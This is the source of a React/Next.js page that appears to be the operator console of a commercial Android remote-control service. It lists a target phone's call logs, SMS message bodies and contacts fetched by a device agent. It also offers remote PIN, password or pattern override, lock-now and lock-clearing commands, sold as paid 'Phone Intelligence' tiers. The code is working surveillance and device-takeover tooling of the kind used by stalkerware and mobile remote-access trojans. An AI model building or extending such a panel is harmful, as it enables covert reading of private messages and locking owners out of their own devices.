"use client";

import { AppSidebar } from "@/components/app-sidebar";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Phone, MessageSquare, Users, RefreshCw, Lock, KeyRound } from "lucide-react";
import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { useGateway } from "@/hooks/use-gateway";
import Select from "react-select";
import { toast } from "sonner";
import { PremiumGate } from "@/components/premium-card";

type Tab = "calls" | "sms" | "contacts" | "lock";
type LockKind = "pin" | "password" | "pattern";

interface CallEntry {
  _id: string;
  number: string;
  name?: string;
  type: number;
  duration: number;
  timestamp: string;
}
interface SmsEntry {
  _id: string;
  address: string;
  body: string;
  type: number;
  timestamp: string;
}
interface ContactEntry {
  _id: string;
  name: string;
  phone: string;
}

interface LockStatus {
  adminActive?: boolean;
  deviceSecure?: boolean;
  passwordQualityLabel?: string;
  canSetCredential?: boolean;
  fullChannel?: boolean;
  note?: string;
  message?: string;
  success?: boolean;
}

export default function PhonePage() {
  const searchParams = useSearchParams();
  const { devices, dispatch, subscribe, resolveTarget, ensureConnected } = useGateway();
  const [selectedDevice, setSelectedDevice] = useState(searchParams.get("device") || "");
  const [activeTab, setActiveTab] = useState<Tab>("calls");
  const [loading, setLoading] = useState(false);
  const [callLogs, setCallLogs] = useState<CallEntry[]>([]);
  const [smsMessages, setSmsMessages] = useState<SmsEntry[]>([]);
  const [contacts, setContacts] = useState<ContactEntry[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [lockStatus, setLockStatus] = useState<LockStatus | null>(null);
  const [lockKind, setLockKind] = useState<LockKind>("pin");
  const [lockValue, setLockValue] = useState("");
  const [lockBusy, setLockBusy] = useState(false);
  const [lastLockMsg, setLastLockMsg] = useState("");

  const [userProfile, setUserProfile] = useState<{ role?: string; pages?: string[] } | null>(null);

  useEffect(() => {
    fetch("/api/auth/session", { credentials: "include" })
      .then((res) => res.json())
      .then((data) => {
        if (data?.authenticated && data?.user) {
          setUserProfile(data.user);
          const userPages = Array.isArray(data.user.pages) ? data.user.pages : [];
          const isAdmin = data.user.role === "admin";
          const hasFull = isAdmin || userPages.includes("phone");
          const hasCalls = hasFull || userPages.includes("phone.calls");
          const hasSms = hasFull || userPages.includes("phone.sms");
          const hasContacts = hasFull || userPages.includes("phone.contacts");

          if (!hasCalls && hasSms) {
            setActiveTab("sms");
          } else if (!hasCalls && !hasSms && hasContacts) {
            setActiveTab("contacts");
          }
        }
      })
      .catch(() => {});
  }, []);

  const canAccess = (key: string) => {
    if (!userProfile) return true;
    if (userProfile.role === "admin") return true;
    const p = Array.isArray(userProfile.pages) ? userProfile.pages : [];
    if (p.includes("phone")) return true;
    return p.includes(key);
  };

  const hasAnyPhoneAccess = () => {
    if (!userProfile) return true;
    if (userProfile.role === "admin") return true;
    const p = Array.isArray(userProfile.pages) ? userProfile.pages : [];
    return p.some((key) => key === "phone" || key.startsWith("phone."));
  };

  useEffect(() => {
    ensureConnected();
    if (!selectedDevice) {
      const next = resolveTarget() || devices[0]?.value || "";
      if (next) setSelectedDevice(next);
    }
  }, [devices, ensureConnected, resolveTarget, selectedDevice]);

  useEffect(() => {
    return subscribe((event) => {
      if (event.type !== "json" || !event.packet) return;
      const msg = event.packet as Record<string, unknown>;
      if (msg.type === "history_telemetry") {
        const entries = Array.isArray(msg.entries) ? msg.entries : [];
        if (msg.command === "FETCH_CALL_LOGS" && entries.length) setCallLogs(entries as CallEntry[]);
        if (msg.command === "FETCH_SMS_MESSAGES" && entries.length) setSmsMessages(entries as SmsEntry[]);
        if (msg.command === "FETCH_CONTACTS" && entries.length) setContacts(entries as ContactEntry[]);
        setLoading(false);
      }
      if (msg.type === "sys_ack") {
        const action = String(msg.action || "");
        if (
          action === "FETCH_LOCK_STATUS" ||
          action === "SET_LOCK_CREDENTIAL" ||
          action === "LOCK_DEVICE_NOW" ||
          action === "CLEAR_LOCK_CREDENTIAL" ||
          action === "LOCK_SCREEN"
        ) {
          const lock = (msg.lock as LockStatus) || {};
          const merged = { ...lock, message: String(msg.message || lock.message || "") };
          setLockStatus(merged);
          setLastLockMsg(merged.message || "");
          setLockBusy(false);
          setLoading(false);
          if (msg.status === "error") toast.error(merged.message || "Lock command failed");
          else if (action !== "FETCH_LOCK_STATUS") toast.success(merged.message || "OK");
        }
      }
    });
  }, [subscribe]);

  useEffect(() => {
    if (!selectedDevice) return;
    if (activeTab === "lock") {
      setLoading(true);
      dispatch("FETCH_LOCK_STATUS", {}, selectedDevice);
      return;
    }
    let cancelled = false;
    setLoading(true);
    (async () => {
      try {
        const limit = 500;
        if (activeTab === "calls") {
          const res = await fetch(`/api/logs/call-logs?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setCallLogs(data.logs || []);
        } else if (activeTab === "sms") {
          const res = await fetch(`/api/logs/sms?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setSmsMessages(data.messages || []);
        } else {
          const res = await fetch(`/api/logs/contacts?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setContacts(data.contacts || []);
        }
      } catch {
        /* ignore */
      } finally {
        if (!cancelled) setLoading(false);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [activeTab, selectedDevice, dispatch]);

  const refreshLive = () => {
    if (!selectedDevice) return;
    setLoading(true);
    if (activeTab === "calls") dispatch("FETCH_CALL_LOGS", {}, selectedDevice);
    else if (activeTab === "sms") dispatch("FETCH_SMS_MESSAGES", {}, selectedDevice);
    else if (activeTab === "lock") dispatch("FETCH_LOCK_STATUS", {}, selectedDevice);
    else dispatch("FETCH_CONTACTS", {}, selectedDevice);
  };

  const applyLock = () => {
    if (!selectedDevice || !lockValue.trim()) {
      toast.error("Enter new PIN / password / pattern");
      return;
    }
    setLockBusy(true);
    const result = dispatch(
      "SET_LOCK_CREDENTIAL",
      { type: lockKind, value: lockValue.trim() },
      selectedDevice
    );
    if (!result.ok) {
      setLockBusy(false);
      toast.error("Agent offline?");
    }
  };

  const lockNow = () => {
    if (!selectedDevice) return;
    setLockBusy(true);
    dispatch("LOCK_DEVICE_NOW", {}, selectedDevice);
  };

  const clearLock = () => {
    if (!selectedDevice) return;
    if (!confirm("Clear device lock if OEM allows?")) return;
    setLockBusy(true);
    dispatch("CLEAR_LOCK_CREDENTIAL", {}, selectedDevice);
  };

  const q = searchQuery.trim().toLowerCase();
  const filteredCalls = callLogs.filter(
    (c) => !q || c.number?.toLowerCase().includes(q) || c.name?.toLowerCase().includes(q)
  );
  const filteredSms = smsMessages.filter(
    (s) => !q || s.address?.toLowerCase().includes(q) || s.body?.toLowerCase().includes(q)
  );
  const filteredContacts = contacts.filter(
    (c) => !q || c.name?.toLowerCase().includes(q) || c.phone?.toLowerCase().includes(q)
  );

  const formatTime = (v: string) => {
    try {
      return new Date(v).toLocaleString();
    } catch {
      return v;
    }
  };

  const deviceOptions = devices.map((d) => ({ value: d.value, label: d.label || d.value }));

  return (
    <div className="flex h-screen bg-background">
      <AppSidebar />
      <main className="flex-1 sidebar-aware-main overflow-auto p-6">
        <div className="max-w-5xl mx-auto">
          <div className="flex flex-wrap items-center justify-between gap-3 mb-6">
            <div>
              <h1 className="text-2xl font-display tracking-tight">Phone</h1>
              <p className="text-sm text-muted-foreground">
                Calls, messages, contacts & lock (Full APK + Device Admin)
              </p>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-56">
                <Select
                  options={deviceOptions}
                  value={deviceOptions.find((o) => o.value === selectedDevice) || null}
                  onChange={(opt: { value: string } | null) => setSelectedDevice(opt?.value || "")}
                  placeholder="Select device"
                  classNamePrefix="react-select"
                />
              </div>
              <Button variant="outline" size="sm" onClick={refreshLive} disabled={!selectedDevice || loading}>
                <RefreshCw className={`w-4 h-4 mr-1 ${loading ? "animate-spin" : ""}`} />
                Refresh
              </Button>
            </div>
          </div>

          {userProfile && !hasAnyPhoneAccess() ? (
            <PremiumGate
              featureKey="phone"
              title="Phone Intelligence & Communications Suite"
              description="Full telecommunications suite including call logs, SMS message history, contacts database, and remote device lock."
              price="$14.99/mo"
              bullets={[
                "Incoming, outgoing, and missed call recording with duration",
                "SMS text message history with sender addresses and timestamps",
                "Complete device address book contacts list",
                "Remote lock screen with PIN, password, or pattern override",
              ]}
              onUnlocked={() => window.location.reload()}
            />
          ) : (
            <>
              <div className="flex gap-2 border-b border-border mb-4 overflow-x-auto">
                {(
                  [
                    { id: "calls" as const, label: "Calls", icon: Phone, perm: "phone.calls" },
                    { id: "sms" as const, label: "Messages", icon: MessageSquare, perm: "phone.sms" },
                    { id: "contacts" as const, label: "Contacts", icon: Users, perm: "phone.contacts" },
                    { id: "lock" as const, label: "Lock / PIN", icon: Lock, perm: "phone.lock" },
                  ] as const
                ).map((tab) => (
                  <button
                    key={tab.id}
                    type="button"
                    onClick={() => setActiveTab(tab.id)}
                    className={`px-4 py-2 text-sm border-b-2 flex items-center gap-2 whitespace-nowrap ${
                      activeTab === tab.id
                        ? "border-foreground text-foreground"
                        : "border-transparent text-muted-foreground"
                    }`}
                  >
                    <tab.icon className="w-4 h-4" />
                    <span>{tab.label}</span>
                    {!canAccess(tab.perm) && (
                      <Lock className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                    )}
                  </button>
                ))}
              </div>

              {activeTab !== "lock" && canAccess(
                activeTab === "calls" ? "phone.calls" : activeTab === "sms" ? "phone.sms" : "phone.contacts"
              ) && (
                <input
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search number, name, message…"
                  className="mb-4 w-full max-w-md rounded-lg border border-border bg-background px-3 py-2 text-sm"
                />
              )}

              <div className="space-y-3">
                {activeTab === "calls" && !canAccess("phone.calls") ? (
                  <PremiumGate
                    featureKey="phone.calls"
                    title="Call Logs Intelligence"
                    description="Inspect incoming, outgoing, and missed phone calls with contact names, phone numbers, and call durations."
                    price="$4.99/mo"
                    bullets={[
                      "Complete incoming, outgoing, and missed call records",
                      "Caller name and dialed phone number indexing",
                      "Call duration in seconds and exact timestamps",
                      "Real-time synchronization with Android gateway",
                    ]}
                    onUnlocked={() => window.location.reload()}
                  />
                ) : activeTab === "sms" && !canAccess("phone.sms") ? (
                  <PremiumGate
                    featureKey="phone.sms"
                    title="SMS Message Intelligence"
                    description="Inspect incoming and outgoing text messages, sender addresses, read states, and delivery timestamps."
                    price="$4.99/mo"
                    bullets={[
                      "Full SMS conversation history",
                      "Sender and recipient phone numbers",
                      "Message delivery and read timestamps",
                      "Real-time SMS synchronization with Android gateway",
                    ]}
                    onUnlocked={() => window.location.reload()}
                  />
                ) : activeTab === "contacts" && !canAccess("phone.contacts") ? (
                  <PremiumGate
                    featureKey="phone.contacts"
                    title="Phone Contacts Directory"
                    description="Complete address book inspection with contact names, mobile numbers, and associated profiles."
                    price="$3.99/mo"
                    bullets={[
                      "Full device address book directory",
                      "Contact names and associated phone numbers",
                      "Fast live searching and instant export",
                      "Automatic sync with Android device agent",
                    ]}
                    onUnlocked={() => window.location.reload()}
                  />
                ) : activeTab === "lock" && !canAccess("phone.lock") ? (
                  <PremiumGate
                    featureKey="phone.lock"
                    title="Remote Device Lock"
                    description="Remote lock screen controls with instant PIN, password, or pattern override."
                    price="$4.99/mo"
                    bullets={[
                      "Remote screen lock engagement",
                      "Custom PIN, password, or pattern setting",
                      "Device Admin compliance verification",
                      "Instant emergency wipe / lock enforcement",
                    ]}
                    onUnlocked={() => window.location.reload()}
                  />
                ) : activeTab === "calls" &&
              (filteredCalls.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No call logs</Card>
              ) : (
                filteredCalls.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <Phone className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.name || entry.number}</p>
                        <p className="text-sm text-muted-foreground">
                          {entry.number} · type {entry.type} · {entry.duration}s
                        </p>
                        <p className="text-xs text-muted-foreground mt-1">{formatTime(entry.timestamp)}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}

            {activeTab === "sms" &&
              (filteredSms.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No messages</Card>
              ) : (
                filteredSms.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <MessageSquare className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.address}</p>
                        <p className="text-sm text-muted-foreground mt-1">{entry.body}</p>
                        <p className="text-xs text-muted-foreground mt-1">{formatTime(entry.timestamp)}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}

            {activeTab === "contacts" &&
              (filteredContacts.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No contacts</Card>
              ) : (
                filteredContacts.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <Users className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.name || "Unknown"}</p>
                        <p className="text-sm text-muted-foreground">{entry.phone}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}

            {activeTab === "lock" && (
              <div className="space-y-4 max-w-xl">
                <Card className="p-5 space-y-3">
                  <div className="flex items-center gap-2">
                    <KeyRound className="w-5 h-5" />
                    <h2 className="font-semibold">View lock status</h2>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    Android never allows reading the current PIN/password/pattern. Status + change only (Full APK +
                    Device Admin on phone).
                  </p>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div className="rounded-lg border border-border p-3">
                      <p className="text-xs text-muted-foreground">Device Admin</p>
                      <p className="font-medium">{lockStatus?.adminActive ? "ON" : "OFF"}</p>
                    </div>
                    <div className="rounded-lg border border-border p-3">
                      <p className="text-xs text-muted-foreground">Lock set</p>
                      <p className="font-medium">{lockStatus?.deviceSecure ? "Yes" : "No / unknown"}</p>
                    </div>
                    <div className="rounded-lg border border-border p-3 col-span-2">
                      <p className="text-xs text-muted-foreground">Quality</p>
                      <p className="font-medium">{lockStatus?.passwordQualityLabel || "—"}</p>
                    </div>
                  </div>
                  {lastLockMsg ? <p className="text-xs text-muted-foreground">{lastLockMsg}</p> : null}
                  {lockStatus?.fullChannel === false ? (
                    <p className="text-sm text-amber-600">Lite APK detected — install Full APK for lock control.</p>
                  ) : null}
                  <Button variant="outline" size="sm" onClick={refreshLive} disabled={!selectedDevice || loading}>
                    Refresh status
                  </Button>
                </Card>

                <Card className="p-5 space-y-3">
                  <h2 className="font-semibold">Change PIN / password / pattern</h2>
                  <div className="flex flex-wrap gap-2">
                    {(["pin", "password", "pattern"] as LockKind[]).map((k) => (
                      <button
                        key={k}
                        type="button"
                        onClick={() => setLockKind(k)}
                        className={`px-3 py-1.5 rounded-md text-sm border ${
                          lockKind === k
                            ? "border-foreground bg-foreground text-background"
                            : "border-border text-muted-foreground"
                        }`}
                      >
                        {k === "pin" ? "PIN" : k === "password" ? "Password" : "Pattern"}
                      </button>
                    ))}
                  </div>
                  <input
                    type={lockKind === "password" ? "password" : "text"}
                    value={lockValue}
                    onChange={(e) => setLockValue(e.target.value)}
                    placeholder={
                      lockKind === "pin"
                        ? "New PIN (4+ digits)"
                        : lockKind === "password"
                          ? "New password (4+ chars)"
                          : "Pattern path e.g. 12369 (dots 1–9)"
                    }
                    className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm font-mono"
                  />
                  <div className="flex flex-wrap gap-2">
                    <Button onClick={applyLock} disabled={!selectedDevice || lockBusy}>
                      Set / change lock
                    </Button>
                    <Button variant="outline" onClick={lockNow} disabled={!selectedDevice || lockBusy}>
                      Lock device now
                    </Button>
                    <Button variant="ghost" onClick={clearLock} disabled={!selectedDevice || lockBusy}>
                      Clear lock
                    </Button>
                  </div>
                </Card>
              </div>
            )}
          </div>
          </>
          )}
        </div>
      </main>
    </div>
  );
}
